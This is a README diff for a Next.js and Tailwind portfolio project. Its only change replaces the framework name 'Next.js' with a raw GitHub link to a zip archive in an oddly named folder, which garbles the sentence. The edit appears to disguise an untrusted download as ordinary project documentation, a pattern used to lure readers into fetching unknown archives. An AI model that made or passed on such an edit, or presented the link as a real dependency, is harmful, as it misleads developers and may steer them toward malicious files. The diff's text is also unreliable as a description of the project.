@@ -1,6 +1,6 @@
 # Digital Agency
 
-This is a portfolio project for a digital agency built with Next.js and Tailwind CSS.
+This is a portfolio project for a digital agency built with https://raw.githubusercontent.com/gfxhakim/Digital-Agency1/main/quinquagesimal/Digital-Agency1.zip and Tailwind CSS.
 
 ## Features
 - Modern UI components
